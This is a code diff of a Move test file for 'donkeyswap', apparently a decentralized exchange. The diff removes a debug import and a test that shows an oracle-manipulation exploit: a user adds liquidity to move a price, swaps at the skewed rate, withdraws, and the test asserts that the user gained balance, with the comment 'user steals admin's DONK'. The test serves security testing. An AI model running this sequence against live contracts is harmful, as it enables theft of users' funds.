@@ -5,7 +5,6 @@ module donkeyswap::test {
     use aptos_framework::type_info;
     use aptos_framework::coin;
     use std::string;
-    use std::debug;
     use std::signer::{address_of};
     use aptos_framework::account;
 
@@ -379,63 +378,4 @@ module donkeyswap::test {
         mint<ZEL>(admin_zel, address_of(admin));
         market::add_liquidity<ZEL>(admin, admin_zel);
     }
-
-
-    // in this test, user steals admin's DONK
-    #[test(admin=@donkeyswap, user=@0x2222)]
-    fun WHEN_exploit_oracle_manipulation(admin: &signer, user: &signer) acquires CoinCapability {
-        setup_with_liquidity(admin, user);
-
-        // add extra liquidity
-        let admin_zel = 1000000000;
-        let admin_usdc = 1000000000;
-        let admin_huge = 1000000000;
-        mint<ZEL>(admin_zel, address_of(admin));
-        mint<USDC>(admin_usdc, address_of(admin));
-        mint<HUGE>(admin_huge, address_of(admin));
-        market::add_liquidity<ZEL>(admin, admin_zel);
-        market::add_liquidity<USDC>(admin, admin_usdc);
-        market::add_liquidity<HUGE>(admin, admin_huge);
-
-        //debug::print(&coin::balance<ZEL>((@donkeyswap)));
-        //debug::print(&coin::balance<USDC>((@donkeyswap)));
-
-        //let orig_huge_price = market::get_price(type_info::type_of<HUGE>(), type_info::type_of<USDC>());
-        //debug::print(&orig_huge_price);
-
-        let init_user_zel = 100000000000;
-        let init_user_huge = 100000;
-        let init_user_usdc = 10000000000;
-        mint<ZEL>(init_user_zel, address_of(user));
-        mint<HUGE>(init_user_huge, address_of(user));
-        mint<USDC>(init_user_usdc, address_of(user));
-        let zel_balance = coin::balance<ZEL>(address_of(user));
-        let huge_balance = coin::balance<HUGE>(address_of(user));
-        let usdc_balance = coin::balance<USDC>(address_of(user));
-        debug::print(&zel_balance);
-        debug::print(&huge_balance);
-        debug::print(&usdc_balance);
-        debug::print(&1337);
-
-        // A/USD and B/USD
-        // we want to get B at a cheap rate
-        // deposit B to lower the price of B/USD
-        // swap A for B
-        
-        let user_huge = init_user_huge;
-        let user_zel = init_user_zel;
-        let lp_amount = market::add_liquidity<ZEL>(user, user_zel); // deposit ZEL, lower price of ZEL/HUGE
-        market::swap<HUGE, ZEL>(user, user_huge); // swap HUGE for ZEL
-        market::remove_liquidity<HUGE>(user, lp_amount);
-
-
-        debug::print(&1338);
-        debug::print(&coin::balance<ZEL>(address_of(user)));
-        debug::print(&coin::balance<HUGE>(address_of(user)));
-        debug::print(&coin::balance<USDC>(address_of(user)));
-        assert!(coin::balance<ZEL>(address_of(user)) > zel_balance, ERR_UNEXPECTED_BALANCE);
-        assert!(coin::balance<HUGE>(address_of(user)) > huge_balance, ERR_UNEXPECTED_BALANCE);
-        assert!(coin::balance<USDC>(address_of(user)) > usdc_balance, ERR_UNEXPECTED_BALANCE);
-    }
-    
 }
